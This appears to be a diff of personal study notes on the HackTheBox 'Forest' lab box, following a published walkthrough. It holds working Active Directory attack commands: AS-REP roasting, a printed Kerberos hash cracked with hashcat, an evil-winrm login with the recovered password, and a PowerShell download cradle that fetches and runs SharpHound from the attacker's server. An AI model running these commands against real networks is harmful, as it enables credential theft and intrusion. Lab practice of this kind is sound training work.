@@ -406,3 +406,138 @@ The command completed successfully.
 
     evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
     
+    
+okay. back again after a mess. i'm going to give up using z.ai, because it's not able to figure out what to do next, and just "cheat" and read the guide again.
+
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html
+
+we have user blood, i think. yeah.
+
+we had "null auth" enabled, which let us get a kerberos hash from the user svc-alfresco.
+
+then we used uh. i don't know. some tool to convert the kerberoasted hash into a password,
+
+then we used `evil-winrm` to get a shell as svc-alfresco.
+
+then user blood.
+
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html
+
+
+okay. this guy uses `dig` to query DNS.
+
+    dig @10.129.95.210 htb.local
+    # response: okay. using wireshark shows us that a DNS server is running on port 53.
+    
+    
+    dig @10.129.95.210 forest.htb.local
+    # same reply
+
+he then immediately tries to do a DNS zone transfer (low hanging fruit) and fails.
+
+..
+
+he then tries to use `smbmap` and `smbclient` to enumerate the shares without a password. and fails.
+
+                                                                                  
+    ┌──(henrypost㉿kali-toughwolf)-[~]
+    └─$ smbclient -N -L  //forest
+    Anonymous login successful
+    
+   	Sharename       Type      Comment
+   	---------       ----      -------
+    Reconnecting with SMB1 for workgroup listing.
+    do_connect: Connection to forest failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+    Unable to connect with SMB1 -- no workgroup available
+
+and then uses some other CLI tool
+
+    rpcclient -U "" -N forest
+    enumdomusers
+    (...list of users)
+    enumdomgroups
+    (...list of groups)
+
+
+you can also look at an individual group
+
+    querygroup    0x200
+    querygroupmem 0x200
+
+okay, so next up he says
+
+"I'm going to try kerberoasting. It usually requires creds though. BUT, some accounts have `UF_DONT_REQUIRE_PREAUTH` which means "do not require kerberos preauthentication".
+
+if we `enumdomusers` we get a bunch of users, and if we `enumdomgroups` we get a bunch of groups.
+
+    for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.129.95.210 htb/${user} | grep -v Impacket; done
+
+(how does he generate users.txt  ???)
+> I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts:
+
+I feel like BloodHound is a better tool for this. I'm going to try to run it.
+
+```
+bloodhound-python -d htb -u Administrator -p 'Password123!' -dc 10.129.95.210
+```
+
+nevermind. we have to run bloodhound later when we have user blood.
+
+
+    for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.129.95.210 htb/${user} | grep -v Impacket; done
+    
+    
+yep. this worked.
+    [*] Getting TGT for svc-alfresco
+    $krb5asrep$23$svc-alfresco@HTB:dcd17305cb99048d1ac4b92ee0ee596d$7ce5ac53de9985e222bd526a6869028ab2cf0e68368d479b31f358e60feab0b8eb93bdffd46af7b889ee2cd1a9aa1865070083468e9ccafec98f588046a89dbcc931dab5d25620ffe0be5b38e81609cab6294ca1ff2c8a12e9a7f65373bc370bcc58c2b836e0e8b87ec4e57d2f47c0b63e0c2cfb8f351f594c4faa06fbadc6d4b1ae478d82df744dcf0f1a7e64bf9b425e2812a07527b5781f338eb00cff87420c3c2a09dd791344b2b4e9f47c377479d6a3638bc27bd7e28c89fc779da6f4ca2c4eafa7571cad8c8b747e9ad5564cb8fd14c095a14978d6b1f2514b65972711
+
+i guess manual `rpcclient` is a good thing to practice.
+
+and we use hashcat to crack the hash.
+
+    hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+    hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force --show
+    s3rvice
+
+sweet. now, I think the guide loads SharpHound onto the victim user `svc-alfresco`.
+
+
+victim needs to download `10.10.15.246:8000/SharpHound.ps1` and run it.
+
+used `python3 -m http.server` to serve sharphound. yeah.
+
+    evil-winrm -i forest -u 'svc-alfresco' -p 's3rvice'
+
+    iex(new-object net.webclient).downloadstring("http://10.10.15.246:8000/SharpHound.ps1")
+    # sweet, this worked, now I need to run the cmdlet commands to collect data.
+    
+    invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+    
+    # okay, so maybe it didn't work. let me try to download the .ps1 as a file and not load it into memory.
+
+    Invoke-WebRequest -Uri "http://10.10.15.246:8000/SharpHound.ps1" -OutFile "C:\Users\svc-alfresco\Desktop\SharpHound.ps1" -usebasicparsing
+    
+    cd ~/Desktop
+    ./SharpHound.ps1
+    invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice -OutputDirectory C:\Users\svc-alfresco\Desktop\
+
+    # weird, no zip file. let me read the docs.
+    # just read the source code. bingo! we needed `-OutputDirectory`.
+
+    # now how do we get the .zip file?
+    # okay, evil-winrm has a `download` command, that's pretty simple.
+    
+    download 20260216115235_BloodHound.zip /home/henrypost/Git/oscp/boxes/htb/Forest/bloodhoundresults.zip
+
+
+cool now i just need to run bloodhound locally.
+
+https://www.kali.org/docs/troubleshooting/postgresql-collation-mismatch-error/
+
+    bloodhound-setup
+    neo4j
+    neo4j
+
+okay cool.
+
+"Find Shorter Paths to Domain Admin" is a saved query we should use.
